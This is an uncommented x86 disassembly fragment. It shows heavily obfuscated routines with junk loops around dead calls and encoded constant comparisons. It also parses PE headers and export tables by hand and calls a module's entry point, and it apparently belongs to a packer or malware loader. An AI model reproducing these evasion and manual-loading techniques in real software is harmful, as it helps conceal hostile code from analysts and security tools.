  4229e4:	cmp    DWORD PTR ds:0x42863f,0x9
  4229eb:	jne    0x4229fe
  4229f1:	mov    esi,DWORD PTR ds:0x42863f
  4229f7:	inc    esi
  4229f8:	mov    DWORD PTR ds:0x42863f,esi
  4229fe:	jmp    0x4229ab
  422a03:	mov    DWORD PTR [ebp-0x18],eax
  422a06:	mov    eax,DWORD PTR [ebp+0xc]
  422a09:	mov    esi,DWORD PTR [ebp-0x8]
  422a0c:	xor    eax,ecx
  422a0e:	add    eax,edx
  422a10:	imul   eax,DWORD PTR [esi]
  422a13:	mov    esi,DWORD PTR [ebp+0x8]
  422a16:	xor    esi,ecx
  422a18:	add    esi,edx
  422a1a:	cmp    esi,eax
  422a1c:	mov    eax,DWORD PTR [ebp-0x4]
  422a1f:	push   ebx
  422a20:	je     0x422a3f
  422a26:	mov    esi,DWORD PTR [ebp-0x18]
  422a29:	add    DWORD PTR [eax],esi
  422a2b:	mov    eax,DWORD PTR [ebp-0x4]
  422a2e:	mov    esi,DWORD PTR [ebp+0xc]
  422a31:	xor    esi,ecx
  422a33:	add    esi,edx
  422a35:	imul   esi,DWORD PTR [eax]
  422a38:	mov    DWORD PTR [eax],esi
  422a3a:	jmp    0x422a44
  422a3f:	mov    esi,DWORD PTR [ebp+0x14]
  422a42:	xor    DWORD PTR [eax],esi
  422a44:	mov    eax,DWORD PTR [ebp-0x4]
  422a47:	mov    edi,DWORD PTR [ebp+0x10]
  422a4a:	xor    edi,ecx
  422a4c:	mov    esi,0xffcd8d14
  422a51:	mov    ebx,esi
  422a53:	sub    ebx,edi
  422a55:	add    DWORD PTR [eax],ebx
  422a57:	mov    eax,DWORD PTR [ebp-0x4]
  422a5a:	mov    edi,DWORD PTR [ebp-0x8]
  422a5d:	add    edi,DWORD PTR [eax]
  422a5f:	mov    DWORD PTR [ebp-0x8],edi
  422a62:	mov    eax,DWORD PTR [ebp+0xc]
  422a65:	mov    edi,DWORD PTR [ebp+0xc]
  422a68:	xor    edi,ecx
  422a6a:	xor    eax,ecx
  422a6c:	lea    eax,[eax+edi*1+0x64e5d8]
  422a73:	mov    edi,DWORD PTR [ebp+0xc]
  422a76:	xor    edi,ecx
  422a78:	add    edi,edx
  422a7a:	imul   eax,edi
  422a7d:	mov    edi,DWORD PTR [ebp+0xc]
  422a80:	xor    edi,ecx
  422a82:	sub    edi,eax
  422a84:	mov    eax,DWORD PTR [ebp-0x4]
  422a87:	add    edi,edx
  422a89:	cmp    DWORD PTR [eax],edi
  422a8b:	mov    eax,DWORD PTR [ebp-0x4]
  422a8e:	mov    edi,DWORD PTR [ebp+0x10]
  422a91:	jg     0x422aa4
  422a97:	xor    edi,ecx
  422a99:	mov    ebx,esi
  422a9b:	sub    ebx,edi
  422a9d:	add    DWORD PTR [eax],ebx
  422a9f:	jmp    0x422aaa
  422aa4:	xor    edi,ecx
  422aa6:	add    edi,edx
  422aa8:	add    DWORD PTR [eax],edi
  422aaa:	mov    eax,DWORD PTR [ebp-0x8]
  422aad:	mov    edi,DWORD PTR [ebp-0x10]
  422ab0:	mov    eax,DWORD PTR [eax]
  422ab2:	xor    edi,ecx
  422ab4:	add    edi,0x3272eb
  422aba:	not    edi
  422abc:	and    eax,edi
  422abe:	movsx  di,BYTE PTR [eax+0x1]
  422ac3:	mov    ebx,0x3b56
  422ac8:	sub    di,bx
  422acb:	mov    ebx,0x8a94
  422ad0:	xor    di,bx
  422ad3:	mov    ebx,0x4f90
  422ad8:	cmp    di,bx
  422adb:	jne    0x422b03
  422ae1:	movsx  di,BYTE PTR [eax]
  422ae5:	mov    ebx,0x3b56
  422aea:	sub    di,bx
  422aed:	mov    ebx,0x8a94
  422af2:	xor    di,bx
  422af5:	mov    ebx,0x4e63
  422afa:	cmp    di,bx
  422afd:	je     0x422b13
  422b03:	mov    edi,DWORD PTR [ebp-0x10]
  422b06:	xor    edi,ecx
  422b08:	mov    ebx,esi
  422b0a:	sub    ebx,edi
  422b0c:	add    eax,ebx
  422b0e:	jmp    0x422abe
  422b13:	mov    esi,DWORD PTR [ebp-0x14]
  422b16:	mov    esi,DWORD PTR [esi]
  422b18:	mov    edi,DWORD PTR [eax+0x3c]
  422b1b:	lea    esi,[edi+esi*8+0x78]
  422b1f:	mov    esi,DWORD PTR [esi+eax*1]
  422b22:	mov    DWORD PTR [ebp-0x8],esi
  422b25:	mov    esi,DWORD PTR [ebp+0x8]
  422b28:	xor    esi,ecx
  422b2a:	add    esi,edx
  422b2c:	mov    DWORD PTR [ebp-0x14],esi
  422b2f:	mov    esi,DWORD PTR [ebp+0x8]
  422b32:	mov    edi,DWORD PTR [ebp-0x8]
  422b35:	xor    esi,ecx
  422b37:	add    esi,edx
  422b39:	pop    ebx
  422b3a:	cmp    edi,esi
  422b3c:	jne    0x422b5a
  422b42:	mov    eax,DWORD PTR [ebp+0xc]
  422b45:	xor    eax,ecx
  422b47:	mov    ecx,DWORD PTR [ebp-0x8]
  422b4a:	add    eax,edx
  422b4c:	imul   eax,ecx
  422b4f:	mov    DWORD PTR [ebp-0x8],eax
  422b52:	push   DWORD PTR [ebp+0x18]
  422b55:	jmp    0x422bae
  422b5a:	mov    ecx,DWORD PTR [ebp-0x8]
  422b5d:	add    ecx,eax
  422b5f:	mov    DWORD PTR [ebp-0x14],ecx
  422b62:	mov    ecx,DWORD PTR [ebp-0x14]
  422b65:	mov    ecx,DWORD PTR [ecx+0xc]
  422b68:	movsx  cx,BYTE PTR [ecx+eax*1]
  422b6d:	mov    edx,0x3b56
  422b72:	sub    cx,dx
  422b75:	mov    edx,0x8a94
  422b7a:	xor    cx,dx
  422b7d:	mov    edx,0x4e61
  422b82:	cmp    cx,dx
  422b85:	jne    0x422b52
  422b8b:	mov    ecx,DWORD PTR ds:0x4282ef
  422b91:	mov    ecx,DWORD PTR [ecx+0x198]
  422b97:	mov    DWORD PTR [ecx],eax
  422b99:	jmp    0x422bbf
  422b9e:	mov    ecx,DWORD PTR [ebp+0x18]
  422ba1:	cmp    ecx,0xf89c85b1
  422ba7:	jne    0x422bbf
  422bad:	push   eax
  422bae:	push   DWORD PTR [ebp+0x14]
  422bb1:	push   DWORD PTR [ebp+0x10]
  422bb4:	push   DWORD PTR [ebp+0xc]
  422bb7:	push   DWORD PTR [ebp+0x8]
  422bba:	call   0x422608
  422bbf:	pop    edi
  422bc0:	pop    esi
  422bc1:	leave  
  422bc2:	ret    0x14
  422bc5:	push   ebp
  422bc6:	mov    ebp,esp
  422bc8:	sub    esp,0x54
  422bcb:	add    DWORD PTR ds:0x428657,0x428603
  422bd5:	push   0x4283ff
  422bda:	call   DWORD PTR ds:0x4287cf
  422be0:	sbb    DWORD PTR ds:0x428647,0x42860b
  422bea:	test   eax,eax
  422bec:	je     0x422c03
  422bf2:	xor    eax,eax
  422bf4:	mov    DWORD PTR ds:0x428677,0x34e1
  422bfe:	jmp    0x4234eb
  422c03:	mov    DWORD PTR [ebp-0x2c],0x0
  422c0a:	xor    ecx,0x686a
  422c10:	mov    eax,DWORD PTR [ebp-0x20]
  422c13:	mov    DWORD PTR [ebp-0x20],eax
  422c16:	mov    ecx,0xf89c85b0
  422c1b:	and    DWORD PTR ds:0x428647,0x0
  422c25:	mov    edx,DWORD PTR ds:0x428647
  422c2b:	inc    edx
  422c2c:	mov    DWORD PTR ds:0x428647,edx
  422c32:	cmp    DWORD PTR ds:0x428647,0x27
  422c39:	jge    0x422c5f
  422c3f:	jmp    0x422c52
  422c44:	push   DWORD PTR [ebp-0xc]
  422c47:	push   0x4285eb
  422c4c:	call   DWORD PTR ds:0x4287b3
  422c52:	cmp    DWORD PTR ds:0x428647,0x19
  422c59:	jb     0x422c25
  422c5f:	mov    DWORD PTR [ebp-0x4],ecx
  422c62:	and    DWORD PTR ds:0x428647,0x0
  422c6c:	xor    edx,edx
  422c6e:	or     edx,DWORD PTR ds:0x428647
  422c74:	inc    edx
  422c75:	mov    DWORD PTR ds:0x428647,edx
  422c7b:	cmp    DWORD PTR ds:0x428647,0xc
  422c82:	jl     0x422cba
  422c88:	jmp    0x422c93
  422c8d:	call   DWORD PTR ds:0x4287b7
  422c93:	cmp    DWORD PTR ds:0x428647,0xb
  422c9a:	jne    0x422cad
  422ca0:	mov    edx,DWORD PTR ds:0x428647
  422ca6:	inc    edx
  422ca7:	mov    DWORD PTR ds:0x428647,edx
  422cad:	cmp    DWORD PTR ds:0x428647,0x1f
  422cb4:	jb     0x422c6c
  422cba:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  422cc1:	lea    eax,[ebp-0x14]
  422cc4:	xor    edx,DWORD PTR ds:0x42866b
  422cca:	mov    DWORD PTR [ebp-0x2c],eax
  422ccd:	movzx  edx,BYTE PTR ds:0x428667
  422cd4:	add    DWORD PTR ds:0x4285d7,edx
  422cda:	lea    eax,[ebp-0x18]
  422cdd:	mov    DWORD PTR [ebp-0x24],eax
  422ce0:	movzx  eax,WORD PTR ds:0x428607
  422ce7:	add    DWORD PTR ds:0x428603,eax
  422ced:	mov    eax,ds:0x4282ef
  422cf2:	neg    edx
  422cf4:	mov    eax,DWORD PTR [eax+0x1c8]
  422cfa:	and    DWORD PTR ds:0x4285e7,0x0
  422d04:	xor    edx,edx
  422d06:	add    edx,DWORD PTR ds:0x4285e7
  422d0c:	inc    edx
  422d0d:	mov    DWORD PTR ds:0x4285e7,edx
  422d13:	cmp    DWORD PTR ds:0x4285e7,0x9
  422d1a:	jl     0x422d55
  422d20:	jmp    0x422d2e
  422d25:	push   DWORD PTR [ebp-0x18]
  422d28:	call   DWORD PTR ds:0x4287bb
  422d2e:	cmp    DWORD PTR ds:0x4285e7,0x8
  422d35:	jne    0x422d48
  422d3b:	mov    edx,DWORD PTR ds:0x4285e7
  422d41:	inc    edx
  422d42:	mov    DWORD PTR ds:0x4285e7,edx
  422d48:	cmp    DWORD PTR ds:0x4285e7,0x1b
  422d4f:	jb     0x422d04
  422d55:	mov    eax,DWORD PTR [eax]
  422d57:	adc    edx,0x4266
  422d5d:	mov    edx,DWORD PTR [ebp-0x24]
  422d60:	push   ebx
  422d61:	push   esi
  422d62:	push   edi
  422d63:	xor    DWORD PTR ds:0x42865b,0x2427
  422d6d:	mov    edi,0x75108a4
  422d72:	and    DWORD PTR ds:0x42867b,0x0
  422d7c:	xor    ebx,ebx
  422d7e:	or     ebx,DWORD PTR ds:0x42867b
  422d84:	inc    ebx
  422d85:	mov    DWORD PTR ds:0x42867b,ebx
  422d8b:	cmp    DWORD PTR ds:0x42867b,0x18
  422d92:	jg     0x422dca
  422d98:	jmp    0x422dbd
  422d9d:	push   0x7b2e
  422da2:	push   0x428028
  422da7:	push   DWORD PTR [ebp-0x20]
  422daa:	push   0x42800b
  422daf:	push   0x82c9
  422db4:	push   DWORD PTR [ebp-0x10]
  422db7:	call   DWORD PTR ds:0x4287bf
  422dbd:	cmp    DWORD PTR ds:0x42867b,0x10
  422dc4:	jb     0x422d7c
  422dca:	xor    eax,edi
  422dcc:	mov    ebx,0x3272ec
  422dd1:	sbb    DWORD PTR ds:0x4285ef,0x42860b
  422ddb:	add    eax,ebx
  422ddd:	mov    DWORD PTR [edx],eax
  422ddf:	mov    eax,ds:0x4284f3
  422de4:	cmp    eax,0x445cecf9
  422de9:	jne    0x422eb1
  422def:	sbb    DWORD PTR ds:0x42860f,0x5794
  422df9:	mov    eax,DWORD PTR [ebp-0x4]
  422dfc:	mov    esi,DWORD PTR ds:0x42864b
  422e02:	or     esi,DWORD PTR ds:0x4285cf
  422e08:	mov    DWORD PTR ds:0x42864b,esi
  422e0e:	mov    edx,DWORD PTR ds:0x4282ef
  422e14:	xor    DWORD PTR ds:0x42863f,0x1fa5
  422e1e:	mov    edx,DWORD PTR [edx+0x198]
  422e24:	xor    DWORD PTR ds:0x42864f,ecx
  422e2a:	xor    eax,edi
  422e2c:	add    eax,ebx
  422e2e:	mov    DWORD PTR [edx],eax
  422e30:	sub    DWORD PTR ds:0x428617,edx
  422e36:	mov    eax,DWORD PTR [ebp-0x4]
  422e39:	mov    edx,DWORD PTR ds:0x428637
  422e3f:	add    DWORD PTR ds:0x428663,edx
  422e45:	xor    eax,edi
  422e47:	and    DWORD PTR ds:0x42867b,0x0
  422e51:	xor    edx,edx
  422e53:	or     edx,DWORD PTR ds:0x42867b
  422e59:	inc    edx
  422e5a:	mov    DWORD PTR ds:0x42867b,edx
  422e60:	cmp    DWORD PTR ds:0x42867b,0xb
  422e67:	jg     0x422ea4
  422e6d:	jmp    0x422e7d
  422e72:	push   0x4280a2
  422e77:	call   DWORD PTR ds:0x4287c3
  422e7d:	cmp    DWORD PTR ds:0x42867b,0xa
  422e84:	jne    0x422e97
  422e8a:	mov    edx,DWORD PTR ds:0x42867b
  422e90:	inc    edx
  422e91:	mov    DWORD PTR ds:0x42867b,edx
  422e97:	cmp    DWORD PTR ds:0x42867b,0x18
  422e9e:	jb     0x422e51
  422ea4:	add    eax,ebx
  422ea6:	sub    DWORD PTR ds:0x428627,ecx
  422eac:	mov    ds:0x4284f3,eax
  422eb1:	mov    edx,DWORD PTR ds:0x4285e7
  422eb7:	and    edx,DWORD PTR ds:0x428617
  422ebd:	mov    DWORD PTR ds:0x4285e7,edx
  422ec3:	mov    eax,ds:0x4282ef
  422ec8:	xor    edx,DWORD PTR ds:0x42865f
  422ece:	mov    eax,DWORD PTR [eax+0x18c]
  422ed4:	sbb    edx,0x43ef
  422eda:	mov    eax,DWORD PTR [eax]
  422edc:	adc    edx,esi
  422ede:	mov    DWORD PTR [ebp-0x34],eax
  422ee1:	mov    eax,0xf89c85bc
  422ee6:	mov    DWORD PTR [ebp-0x24],eax
  422ee9:	and    DWORD PTR ds:0x42861f,0x0
  422ef3:	mov    edx,DWORD PTR ds:0x42861f
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42861f,edx
  422f00:	cmp    DWORD PTR ds:0x42861f,0x1e
  422f07:	jle    0x422f41
  422f0d:	jmp    0x422f34
  422f12:	push   0x4285cf
  422f17:	push   0x2375
  422f1c:	push   0x5548
  422f21:	push   0x51cc
  422f26:	push   0x80b2
  422f2b:	push   DWORD PTR [ebp-0x28]
  422f2e:	call   DWORD PTR ds:0x4287c7
  422f34:	cmp    DWORD PTR ds:0x42861f,0x17
  422f3b:	jb     0x422ef3
  422f41:	mov    DWORD PTR [ebp-0x24],eax
  422f44:	mov    DWORD PTR ds:0x42866b,0x46d0
  422f4e:	mov    DWORD PTR [ebp-0x24],eax
  422f51:	xor    esi,esi
  422f53:	or     esi,DWORD PTR ds:0x4285ef
  422f59:	sub    DWORD PTR ds:0x428673,esi
  422f5f:	mov    DWORD PTR [ebp-0x24],ecx
  422f62:	mov    DWORD PTR [ebp-0x38],eax
  422f65:	and    esi,0x6095
  422f6b:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  422f72:	sub    DWORD PTR ds:0x428653,edi
  422f78:	mov    esi,DWORD PTR [ebp-0x4]
  422f7b:	mov    ecx,DWORD PTR [ebp-0x8]
  422f7e:	mov    edx,DWORD PTR ds:0x4286a7
  422f84:	mov    edx,DWORD PTR [edx]
  422f86:	xor    DWORD PTR ds:0x4285cf,edx
  422f8c:	mov    edx,DWORD PTR [ebp-0x8]
  422f8f:	xor    edx,edi
  422f91:	xor    ecx,edi
  422f93:	add    DWORD PTR ds:0x42861f,0x42860f
  422f9d:	add    ecx,edx
  422f9f:	sbb    edx,0x585b
  422fa5:	mov    edx,DWORD PTR [ebp-0x8]
  422fa8:	xor    esi,edi
  422faa:	xor    edx,edi
  422fac:	adc    DWORD PTR ds:0x428647,0x7d1c
  422fb6:	add    esi,ebx
  422fb8:	mov    DWORD PTR ds:0x428607,0x675c
  422fc2:	lea    ecx,[ecx+edx*1+0x9758c4]
  422fc9:	mov    DWORD PTR ds:0x428647,0x161d
  422fd3:	cmp    esi,ecx
  422fd5:	mov    DWORD PTR ds:0x42861b,0x50e4
  422fdf:	ja     0x4230fe
  422fe5:	xor    DWORD PTR ds:0x4285cf,0x42862b
  422fef:	mov    eax,DWORD PTR [ebp-0x8]
  422ff2:	sbb    DWORD PTR ds:0x42866b,0x4285eb
  422ffc:	xor    eax,edi
  422ffe:	and    DWORD PTR ds:0x428633,0x42865b
  423008:	lea    eax,[eax+esi*1+0x3272ec]
  42300f:	push   eax
  423010:	mov    eax,DWORD PTR [ebp-0x24]
  423013:	xor    DWORD PTR ds:0x42863b,0x428647
  42301d:	xor    eax,edi
  42301f:	sbb    DWORD PTR ds:0x4285f7,0x428637
  423029:	lea    eax,[ebp+eax*1+0x3272f4]
  423030:	push   eax
  423031:	xor    eax,eax
  423033:	add    eax,DWORD PTR ds:0x428653
  423039:	or     DWORD PTR ds:0x4285ef,eax
  42303f:	mov    eax,ds:0x4282ef
  423044:	push   DWORD PTR [eax+0x1bc]
  42304a:	call   0x40aa5b
  42304f:	and    DWORD PTR ds:0x428673,0x0
  423059:	mov    eax,ds:0x428673
  42305e:	inc    eax
  42305f:	mov    ds:0x428673,eax
  423064:	cmp    DWORD PTR ds:0x428673,0x2d
  42306b:	jb     0x423093
  423071:	jmp    0x423086
  423076:	push   0x428657
  42307b:	push   0x4280ae
  423080:	call   DWORD PTR ds:0x4287cb
  423086:	cmp    DWORD PTR ds:0x428673,0x1d
  42308d:	jb     0x423059
  423093:	mov    eax,DWORD PTR [ebp-0x8]
  423096:	or     ecx,0x5d69
  42309c:	xor    eax,edi
  42309e:	lea    esi,[esi+eax*1+0x3272ec]
  4230a5:	not    ecx
  4230a7:	mov    eax,DWORD PTR [ebp-0x8]
  4230aa:	mov    DWORD PTR ds:0x42860b,0x501a
  4230b4:	mov    ecx,DWORD PTR [ebp-0x8]
  4230b7:	xor    ecx,edi
  4230b9:	sbb    DWORD PTR ds:0x428667,0x42864b
  4230c3:	xor    eax,edi
  4230c5:	sbb    DWORD PTR ds:0x4285ef,0xbec
  4230cf:	add    eax,ecx
  4230d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4230d4:	xor    ecx,edi
  4230d6:	mov    DWORD PTR ds:0x4285e3,0x1b1e
  4230e0:	lea    eax,[eax+ecx*1+0x9758c4]
  4230e7:	cmp    esi,eax
  4230e9:	mov    DWORD PTR ds:0x42865b,0x1916
  4230f3:	jbe    0x422fe5
  4230f9:	mov    eax,0xf89c85bc
  4230fe:	mov    ecx,DWORD PTR [ebp+0xc]
  423101:	mov    DWORD PTR ds:0x428173,ecx
  423107:	or     DWORD PTR ds:0x4285ff,ebx
  42310d:	mov    ecx,DWORD PTR [ebp+0x10]
  423110:	or     DWORD PTR ds:0x4285d7,ebx
  423116:	mov    DWORD PTR ds:0x4283c7,ecx
  42311c:	mov    DWORD PTR ds:0x42862b,0x16
  423126:	cmp    DWORD PTR ds:0x42862b,0x0
  42312d:	je     0x423172
  423133:	cmp    DWORD PTR ds:0x42862b,0x1e
  42313a:	jg     0x423172
  423140:	jmp    0x423160
  423145:	push   0x2088
  42314a:	push   DWORD PTR [ebp-0x10]
  42314d:	push   0x46c3
  423152:	push   0x5611
  423157:	push   DWORD PTR [ebp-0x20]
  42315a:	call   DWORD PTR ds:0x42879f
  423160:	mov    edx,DWORD PTR ds:0x42862b
  423166:	dec    edx
  423167:	mov    DWORD PTR ds:0x42862b,edx
  42316d:	jmp    0x423126
  423172:	mov    ecx,DWORD PTR ds:0x428173
  423178:	mov    DWORD PTR ds:0x428673,0x6c19
  423182:	mov    edx,DWORD PTR [ebp-0x2c]
  423185:	and    DWORD PTR ds:0x42864f,0x1852
  42318f:	sub    ecx,ebx
  423191:	sbb    DWORD PTR ds:0x428663,0x32b3
  42319b:	xor    ecx,edi
  42319d:	mov    DWORD PTR ds:0x4285d7,0x3bce
  4231a7:	mov    DWORD PTR [edx],ecx
  4231a9:	mov    edx,DWORD PTR [ebp-0x20]
  4231ac:	mov    ecx,DWORD PTR ds:0x4285eb
  4231b2:	mov    ecx,0xf89c85b0
  4231b7:	cmp    edx,ecx
  4231b9:	mov    DWORD PTR ds:0x428637,0x7ca2
  4231c3:	jne    0x4232d9
  4231c9:	lea    eax,[ebp-0x10]
  4231cc:	mov    DWORD PTR [ebp-0x40],eax
  4231cf:	and    DWORD PTR ds:0x4285df,0x428623
  4231d9:	lea    eax,[ebp+0x4]
  4231dc:	xor    DWORD PTR ds:0x428603,0x2610
  4231e6:	mov    DWORD PTR [ebp-0x10],eax
  4231e9:	mov    eax,DWORD PTR [ebp-0x10]
  4231ec:	test   eax,eax
  4231ee:	je     0x4234cd
  4231f4:	movzx  eax,WORD PTR ds:0x42867b
  4231fb:	sub    DWORD PTR ds:0x42860b,eax
  423201:	mov    eax,DWORD PTR [ebp-0xc]
  423204:	and    ecx,0x315b
  42320a:	mov    eax,DWORD PTR [ebp-0x8]
  42320d:	sbb    DWORD PTR ds:0x428633,edi
  423213:	mov    eax,DWORD PTR [ebp-0x4]
  423216:	mov    ecx,DWORD PTR ds:0x42868f
  42321c:	xor    esi,esi
  42321e:	add    esi,DWORD PTR ds:0x42872b
  423224:	sub    esi,ecx
  423226:	imul   ecx,DWORD PTR [ecx+esi*1]
  42322a:	mov    DWORD PTR [ebp+0xc],eax
  42322d:	xor    ecx,esi
  42322f:	mov    eax,eax
  423231:	mov    eax,ds:0x4282ef
  423236:	mov    eax,DWORD PTR [eax+0x1c8]
  42323c:	mov    eax,DWORD PTR [eax]
  42323e:	cdq    
  42323f:	mov    esi,0xfabdbedd
  423244:	add    eax,esi
  423246:	adc    edx,0xffffffff
  423249:	and    DWORD PTR [ebp-0x38],0x0
  42324d:	xor    edx,0x0
  423250:	mov    DWORD PTR [ebp-0x24],edx
  423253:	mov    edx,DWORD PTR [ebp+0xc]
  423256:	mov    DWORD PTR [ebp-0x3c],edx
  423259:	mov    ecx,0x8a29a137
  42325e:	xor    eax,ecx
  423260:	add    DWORD PTR [ebp-0x3c],esi
  423263:	mov    edx,DWORD PTR [ebp-0x3c]
  423266:	adc    DWORD PTR [ebp-0x38],0xffffffff
  42326a:	xor    edx,ecx
  42326c:	mov    DWORD PTR [ebp-0x30],edx
  42326f:	mov    edx,DWORD PTR [ebp-0x38]
  423272:	xor    edx,0x0
  423275:	mov    DWORD PTR [ebp-0x2c],edx
  423278:	cmp    DWORD PTR [ebp-0x30],eax
  42327b:	jne    0x42328c
  423281:	mov    eax,DWORD PTR [ebp-0x24]
  423284:	cmp    edx,eax
  423286:	je     0x4232b9
  42328c:	mov    eax,ds:0x4282ef
  423291:	mov    eax,DWORD PTR [eax+0x1c0]
  423297:	mov    eax,DWORD PTR [eax]
  423299:	xor    edx,edx
  42329b:	add    eax,esi
  42329d:	adc    edx,0xffffffff
  4232a0:	xor    eax,ecx
  4232a2:	xor    edx,0x0
  4232a5:	cmp    eax,0x70941fe9
  4232aa:	jne    0x4234cd
  4232b0:	cmp    edx,0xffffffff
  4232b3:	jne    0x4234cd
  4232b9:	mov    eax,ds:0x42836b
  4232be:	mov    edx,DWORD PTR ds:0x428373
  4232c4:	xor    eax,edx
  4232c6:	mov    ds:0x42836b,eax
  4232cb:	mov    edx,DWORD PTR ds:0x42836b
  4232d1:	mov    eax,DWORD PTR [ebp-0x10]
  4232d4:	jmp    0x42348d
  4232d9:	mov    edx,DWORD PTR [ebp-0x14]
  4232dc:	cmp    edx,0xf89c85b1
  4232e2:	je     0x42333f
  4232e8:	mov    edx,DWORD PTR [ebp-0x4]
  4232eb:	mov    esi,DWORD PTR [ebp-0x18]
  4232ee:	xor    edx,edi
  4232f0:	add    edx,ebx
  4232f2:	cmp    edx,esi
  4232f4:	je     0x42333f
  4232fa:	mov    eax,ds:0x4282ef
  4232ff:	mov    eax,DWORD PTR [eax+0x194]
  423305:	mov    ecx,DWORD PTR [eax]
  423307:	mov    eax,DWORD PTR [ecx+0x3c]
  42330a:	push   DWORD PTR ds:0x4283c7
  423310:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423314:	push   DWORD PTR ds:0x428173
  42331a:	add    eax,ecx
  42331c:	mov    ecx,DWORD PTR ds:0x4282ef
  423322:	mov    ecx,DWORD PTR [ecx+0x194]
  423328:	push   DWORD PTR [ecx]
  42332a:	call   eax
  42332c:	mov    ecx,DWORD PTR ds:0x4282ef
  423332:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x4234cd
  42333f:	mov    edx,DWORD PTR [ebp-0x4]
  423342:	mov    esi,DWORD PTR [ebp-0x34]
  423345:	xor    edx,edi
  423347:	add    edx,ebx
  423349:	cmp    edx,esi
  42334b:	jne    0x4233a4
  423351:	mov    edx,DWORD PTR [ebp-0x4]
  423354:	mov    esi,DWORD PTR ds:0x4282ef
  42335a:	mov    esi,DWORD PTR [esi+0x198]
  423360:	xor    edx,edi
  423362:	add    edx,ebx
  423364:	cmp    edx,DWORD PTR [esi]
  423366:	jne    0x423381
  42336c:	push   ecx
  42336d:	mov    ecx,DWORD PTR [ebp-0x4]
  423370:	xor    ecx,edi
  423372:	add    ecx,ebx
  423374:	push   ecx
  423375:	push   eax
  423376:	push   DWORD PTR [ebp-0x8]
  423379:	push   DWORD PTR [ebp-0x4]
  42337c:	call   0x422608
  423381:	push   DWORD PTR [ebp-0x8]
  423384:	push   DWORD PTR [ebp-0x4]
  423387:	call   0x401000
  42338c:	mov    eax,DWORD PTR [ebp-0x4]
  42338f:	xor    eax,edi
  423391:	add    eax,ebx
  423393:	mov    ds:0x428373,eax
  423398:	mov    eax,DWORD PTR [ebp-0x4]
  42339b:	xor    eax,edi
  42339d:	add    eax,ebx
  42339f:	mov    ds:0x42836b,eax
  4233a4:	lea    eax,[ebp-0x1c]
  4233a7:	mov    DWORD PTR [ebp-0x44],eax
  4233aa:	lea    eax,[ebp+0x4]
  4233ad:	mov    DWORD PTR [ebp-0x1c],eax
  4233b0:	mov    eax,DWORD PTR [ebp-0x1c]
  4233b3:	test   eax,eax
  4233b5:	je     0x4234cd
  4233bb:	mov    DWORD PTR [ebp-0x48],0xf152c39
  4233c2:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  4233c9:	mov    DWORD PTR [ebp-0x50],0x373fc08
  4233d0:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  4233d7:	call   0x41d64a
  4233dc:	mov    eax,DWORD PTR [ebp-0xc]
  4233df:	mov    eax,DWORD PTR [ebp-0x8]
  4233e2:	mov    eax,DWORD PTR [ebp-0x4]
  4233e5:	mov    DWORD PTR [ebp+0xc],eax
  4233e8:	mov    eax,eax
  4233ea:	mov    eax,ds:0x4282ef
  4233ef:	mov    eax,DWORD PTR [eax+0x1c8]
  4233f5:	mov    eax,DWORD PTR [eax]
  4233f7:	cdq    
  4233f8:	mov    esi,0xfabdbedd
  4233fd:	add    eax,esi
  4233ff:	adc    edx,0xffffffff
  423402:	and    DWORD PTR [ebp-0x38],0x0
  423406:	xor    edx,0x0
  423409:	mov    DWORD PTR [ebp-0x24],edx
  42340c:	mov    edx,DWORD PTR [ebp+0xc]
  42340f:	mov    DWORD PTR [ebp-0x3c],edx
  423412:	mov    ecx,0x8a29a137
  423417:	xor    eax,ecx
  423419:	add    DWORD PTR [ebp-0x3c],esi
  42341c:	mov    edx,DWORD PTR [ebp-0x3c]
  42341f:	adc    DWORD PTR [ebp-0x38],0xffffffff
  423423:	xor    edx,ecx
  423425:	mov    DWORD PTR [ebp-0x30],edx
  423428:	mov    edx,DWORD PTR [ebp-0x38]
  42342b:	xor    edx,0x0
  42342e:	mov    DWORD PTR [ebp-0x2c],edx
  423431:	cmp    DWORD PTR [ebp-0x30],eax
  423434:	jne    0x423445
  42343a:	mov    eax,DWORD PTR [ebp-0x24]
  42343d:	cmp    edx,eax
  42343f:	je     0x423472
  423445:	mov    eax,ds:0x4282ef
  42344a:	mov    eax,DWORD PTR [eax+0x1c0]
  423450:	mov    eax,DWORD PTR [eax]
  423452:	xor    edx,edx
  423454:	add    eax,esi
  423456:	adc    edx,0xffffffff
  423459:	xor    eax,ecx
  42345b:	xor    edx,0x0
  42345e:	cmp    eax,0x70941fe9
  423463:	jne    0x4234cd
  423469:	cmp    edx,0xffffffff
  42346c:	jne    0x4234cd
  423472:	mov    eax,ds:0x42836b
  423477:	mov    edx,DWORD PTR ds:0x428373
  42347d:	xor    eax,edx
  42347f:	mov    ds:0x42836b,eax
  423484:	mov    edx,DWORD PTR ds:0x42836b
  42348a:	mov    eax,DWORD PTR [ebp-0x1c]
  42348d:	add    DWORD PTR [eax],edx
  42348f:	mov    edx,DWORD PTR [ebp+0xc]
  423492:	mov    eax,ds:0x42836b
  423497:	xor    edx,edi
  423499:	add    edx,ebx
  42349b:	xor    ebx,ebx
  42349d:	add    edx,esi
  42349f:	adc    ebx,0xffffffff
  4234a2:	xor    edi,edi
  4234a4:	xor    edx,ecx
  4234a6:	xor    ebx,0x0
  4234a9:	add    eax,esi
  4234ab:	adc    edi,0xffffffff
  4234ae:	xor    eax,ecx
  4234b0:	xor    edi,0x0
  4234b3:	cmp    eax,edx
  4234b5:	jne    0x4234cd
  4234bb:	cmp    edi,ebx
  4234bd:	jne    0x4234cd
  4234c3:	mov    eax,ds:0x42836b
  4234c8:	mov    ds:0x428373,eax
  4234cd:	mov    eax,ds:0x4282ef
  4234d2:	push   0x4
  4234d4:	add    eax,0x1cc
  4234d9:	push   eax
  4234da:	lea    eax,[ebp-0xc]
  4234dd:	push   eax
  4234de:	call   0x40aa5b
  4234e3:	mov    eax,DWORD PTR [ebp-0xc]
  4234e6:	mov    eax,DWORD PTR [eax]
  4234e8:	pop    edi
  4234e9:	pop    esi
  4234ea:	pop    ebx
  4234eb:	leave  
  4234ec:	ret    0xc
  4234ef:	xor    eax,eax
  4234f1:	add    DWORD PTR ds:0x4285f3,0x36c3
